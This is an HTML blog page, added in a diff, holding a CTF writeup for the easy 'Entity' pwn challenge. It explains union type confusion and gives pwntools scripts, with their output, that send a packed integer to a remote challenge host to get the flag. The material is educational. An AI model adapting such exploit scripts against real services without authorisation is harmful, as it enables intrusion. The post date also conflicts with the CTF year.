@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title></title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://cat0nis.github.io/cat0log/style.css">
+    <link rel="stylesheet" href="https://cat0nis.github.io/cat0log/color/green.css">
+
+        <link rel="stylesheet" href="https://cat0nis.github.io/cat0log/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://cat0nis.github.io/cat0log/font-hack-subset.css">
+
+    </head>
+
+<body class="">
+<div class="container">
+    
+    <header class="header">
+        <div class="header__inner">
+            <div class="header__logo">
+                    
+                <a href="https://cat0nis.github.io/cat0log/" style="text-decoration: none;">
+                    <div class="logo">
+                      
+                            Cat-0
+                        
+                    </div>
+                </a>
+            </div>
+        </div>
+
+        
+        <nav class="menu">
+            <ul class="menu__inner">
+                <li><a href="https://cat0nis.github.io/cat0log//blog">blog</a></li>
+            
+                <li><a href="https://cat0nis.github.io/cat0log//tags">tags</a></li>
+            
+                <li><a href="https://cat0nis.github.io/cat0log//archive">archive</a></li>
+            
+                <li><a href="https://www.github.com/cat0nis" target="_blank" rel="noopener noreferrer">github</a></li>
+            </ul>
+        </nav>
+    
+    
+        
+    </header>
+    
+
+    <div class="content">
+        
+    <div class="post">
+        
+    <h1 class="post-title"><a href="https://cat0nis.github.io/cat0log/blog/entity/">CTF Writeup - Entity</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2019-11-27
+        </span>
+
+    </div>
+
+    
+
+        
+        <div class="post-content">
+            <p>Author: Inryatt</p>
+<p>Difficulty: easy</p>
+<p>Category: pwn</p>
+<p>CTF: HackTheBoo 2022</p>
+<p>This writeup has also been published on this cool blog -&gt; <a href="https://cat0nis.github.io/cat0log/blog/entity/%22www.pengrey.com%22">Pengrey's Blog</a></p>
+<hr />
+<p>On this challenge we are provided with both the executable and the source code file for the challenge - this is a white box challenge. Therefore, no reversing of the binary is needed, as we can understand how it works just from the source code itself.</p>
+<h3 id="problem-analysis">Problem analysis</h3>
+<p>To start off, this is the data structure where the program stores the data we give it, which will be referenced further ahead:</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">static union </span><span>{
+</span><span>    </span><span style="color:#8fbfdc;">unsigned long long</span><span> integer;
+</span><span>    </span><span style="color:#8fbfdc;">char</span><span> string[</span><span style="color:#cf6a4c;">8</span><span>];
+</span><span>} DataStore;
+</span></code></pre>
+<p>When connecting to the target machine, this is what we’re presented with:</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>Something strange is coming out of the TV..
+</span><span>
+</span><span>(T)ry to turn it off
+</span><span>(R)un
+</span><span>(C)ry
+</span><span>
+</span><span>&gt;&gt;
+</span></code></pre>
+<p>If T or R are selected, this is shown:</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>This does not seem to work.. (L)ie down </span><span style="color:#ffb964;">or </span><span>(S)cream
+</span></code></pre>
+<p>(Any input that’s not one of these options will result in the program exiting immediately after a small message.)</p>
+<p>Looking at the source code we can see clearly what each option does:</p>
+<ul>
+<li>T → Store a value in DataStore;  In the second option, (L) will store a numeric value and (S) a string.</li>
+<li>R → Will read the value previously stored in DataStore; If (L) is selected it will (try to) read the integer, and if (S) is selected it will attempt to read the string.</li>
+<li>C → If the value stored in the DataStore as the ‘integer’ is <code>13371337</code>, it gives the flag. Otherwise, does nothing.</li>
+</ul>
+<p>It is interesting to note that the program will not allow us to store directly ‘13371337’ as the integer — getting the flag is not that trivial. Also, very small numbers (Under -<strong>18446744073709551615,</strong> to be precise) will underflow;</p>
+<aside>
+❓ The variable that stores an integer (T→L options) is an unsigned long long, which has a maximum value of 18446744073709551615;
+If we attempt to store a value of -18446744073709551616+x then read it (options R→L), we will obtain a value of x, instead of the large negative number.
+</aside>
+<p>However, using this method to get the variable to store 13371337 (By trying to store <code>-18446744073696180278</code> ) does not work, as it is caught by the program. Nonetheless, it is an interesting quirk.</p>
+<h3 id="the-solution">The Solution</h3>
+<p>The big factor that enables this challenge here is the data structure presented above - the DataStore. It is declared as <code>static union</code>, which is explained on <a href="https://en.cppreference.com/w/cpp/language/union">this site</a> as such:</p>
+<blockquote>
+<p>A union is a special class type that can hold only one of its non-static <a href="https://en.cppreference.com/w/cpp/language/data_members">data members</a> at a time.</p>
+</blockquote>
+<p>The key here is that the structure holds only one of the elements (Both the elements in it are non-static) at a time. As such, we can get <em>very</em> interesting results when storing an integer (Options T→L) and then reading it as if it were a string (R→S options), and vice-versa.</p>
+<p>Particularly, by storing a string and then reading it as a numeric value we may even be able to go around the ‘13371337’ restriction and get the flag! For this, some analysis was required. Below are the integer obtained from storing a string and reading as if it were an integer.</p>
+<table><thead><tr><th>String</th><th>Integer</th></tr></thead><tbody>
+<tr><td>‘0’</td><td>2608</td></tr>
+<tr><td>‘1’</td><td>2609</td></tr>
+<tr><td>‘2’</td><td>2610</td></tr>
+<tr><td>…</td><td>…</td></tr>
+<tr><td>‘00’</td><td>667696</td></tr>
+<tr><td>‘01’</td><td>667952</td></tr>
+<tr><td>‘02’</td><td>668208</td></tr>
+<tr><td>‘10’</td><td>667697</td></tr>
+<tr><td></td><td></td></tr>
+</tbody></table>
+<table><thead><tr><th>String</th><th>Integer</th></tr></thead><tbody>
+<tr><td>‘a’</td><td>2657</td></tr>
+<tr><td>‘b’</td><td>2658</td></tr>
+<tr><td>‘c’</td><td>2659</td></tr>
+<tr><td>…</td><td>…</td></tr>
+<tr><td>‘aa’</td><td>680289</td></tr>
+<tr><td>‘ab’</td><td>680545</td></tr>
+<tr><td>‘bb’</td><td>680546</td></tr>
+<tr><td>‘aaa’</td><td>174154081</td></tr>
+<tr><td>‘aab’</td><td>174219617</td></tr>
+</tbody></table>
+<p>As we can see, the numbers returned are not random, there is a clear pattern and sequence, even if I were not able to discover it. Characters that are sequential get sequential corresponding integers.</p>
+<p>Therefore, these cannot be memory addresses or some similar value that’s being fetched, as it wouldn’t be this predictable. </p>
+<p>Now, here we could attempt to bruteforce this until we find the string that would yield us the ‘13371337’ integer via pwntools, but while setting this up, a peculiarity was found.</p>
+<pre data-lang="bash" style="background-color:#151515;color:#e8e8d3;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffb964;">└─$</span><span> python3 smp.py
+</span><span style="color:#ffb964;">[+]</span><span> Starting local process </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./entity</span><span style="color:#556633;">&#39;</span><span>: pid 45378
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\nSomething strange is coming out of the TV..\n\n(T)ry to turn it off\n(R)un\n(C)ry\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\nThis does not seem to work.. (L)ie down or (S)cream\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\nMaybe try a ritual?\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\n(T)ry to turn it off\n(R)un\n(C)ry\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\nThis does not seem to work.. (L)ie down or (S)cream\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\nAnything else to try?\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">123\n\n(T)ry to turn it off\n(R)un\n(C)ry\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">[*]</span><span> Stopped process </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./entity</span><span style="color:#556633;">&#39;</span><span> (pid 45378)
+</span></code></pre>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span>conn = </span><span style="color:#ffb964;">process</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">./entity</span><span style="color:#556633;">&quot;</span><span>)
+</span><span style="color:#888888;"># Store a string in the DataStore
+</span><span style="color:#ffb964;">print</span><span>(conn.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span>conn.</span><span style="color:#ffb964;">send</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">T\r\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(conn.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span>conn.</span><span style="color:#ffb964;">send</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">S\r\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(conn.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span style="color:#888888;"># send bytes here
+</span><span>conn.</span><span style="color:#ffb964;">send</span><span>(</span><span style="color:#ffb964;">p64</span><span>(</span><span style="color:#cf6a4c;">123</span><span>))
+</span><span>conn.</span><span style="color:#ffb964;">send</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\r\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#888888;"># Read the previously sent string as if it were an integer
+</span><span style="color:#ffb964;">print</span><span>(conn.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span>conn.</span><span style="color:#ffb964;">send</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">R\r\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(conn.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span>conn.</span><span style="color:#ffb964;">send</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">L\r\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(conn.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span style="color:#ffb964;">print</span><span>(conn.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span></code></pre>
+<p>If instead of a string (Ex: “123” or b”123”, which is what is sent by typing on the terminal) instead we send a 64-bits integer (Since an unsigned long long, which is what the DataStore uses, is (at least) a 64-bits integer), the output when reading the integer from the DataStore is exactly what we stored as a “string”. Thus, we can get our flag by just sending 13371337.</p>
+<pre data-lang="bash" style="background-color:#151515;color:#e8e8d3;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffb964;">└─$</span><span> python3 pwnthis.py
+</span><span style="color:#ffb964;">[+]</span><span> Opening connection to 142.93.44.104 on port 32124: Done
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\nSomething strange is coming out of the TV..\n\n(T)ry to turn it off\n(R)un\n(C)ry\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\nThis does not seem to work.. (L)ie down or (S)cream\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\nMaybe try a ritual?\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\n(T)ry to turn it off\n(R)un\n(C)ry\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\nThis does not seem to work.. (L)ie down or (S)cream\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\nAnything else to try?\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">13371337\n\n(T)ry to turn it off\n(R)un\n(C)ry\n\n&gt;&gt; </span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">HTB{f1ght_34ch_3nt1ty_45_4_un10n}</span><span style="color:#556633;">&#39;
+</span><span style="color:#ffb964;">[*]</span><span> Closed connection to 142.93.44.104 port 32124
+</span></code></pre>
+<pre data-lang="bash" style="background-color:#151515;color:#e8e8d3;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffb964;">from</span><span> pwn import *
+</span><span style="color:#888888;">#conn = process(&quot;./entity&quot;)
+</span><span style="color:#ffb964;">conn</span><span> = remote(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">142.93.44.104</span><span style="color:#556633;">&quot;</span><span>, 32124)
+</span><span style="color:#888888;"># Store a string in the DataStore
+</span><span style="color:#ffb964;">print</span><span>(conn.recvuntil(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span style="color:#ffb964;">conn.send</span><span>(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">T\r\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(conn.recvuntil(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span style="color:#ffb964;">conn.send</span><span>(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">S\r\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(conn.recvuntil(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span style="color:#888888;"># send bytes here
+</span><span style="color:#ffb964;">conn.send</span><span>(p64(13371337))
+</span><span style="color:#ffb964;">conn.send</span><span>(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\r\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(conn.recvuntil(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span style="color:#ffb964;">conn.send</span><span>(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">R\r\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(conn.recvuntil(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span style="color:#ffb964;">conn.send</span><span>(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">L\r\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(conn.recvuntil(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span style="color:#ffb964;">print</span><span>(conn.recvuntil(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">&gt;&gt; </span><span style="color:#556633;">&#39;</span><span>))
+</span><span style="color:#ffb964;">conn.send</span><span>(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">C\r\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(conn.recvuntil(b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">}</span><span style="color:#556633;">&#39;</span><span>))
+</span></code></pre>
+
+        </div>
+
+        
+        <div class="pagination">
+            <div class="pagination__title">
+                <span class="pagination__title-h">Pssst, there&#x27;s more stuff!</span>
+                <hr />
+            </div>
+            <div class="pagination__buttons">
+                    <span class="button previous">
+                        <a href="https://cat0nis.github.io/cat0log/blog/pumpkin/">
+                            <span class="button__icon">←</span>&nbsp;
+                            <span class="button__text">CTF Writeup - Pumpkin Stand</span>
+                        </a>
+                    </span>
+                
+                </div>
+        </div>
+    
+    </div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright">
+                        <span>© 
+    2025
+ Powered by <a href="https://www.getzola.org/">Zola</a></span>
+                    <span class="copyright-theme">
+                        <span class="copyright-theme-sep">:: </span>
+                        Theme: <a href="https://github.com/pawroman/zola-theme-terminimal/">Terminimal</a> by pawroman
+                    </span>
+                </div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
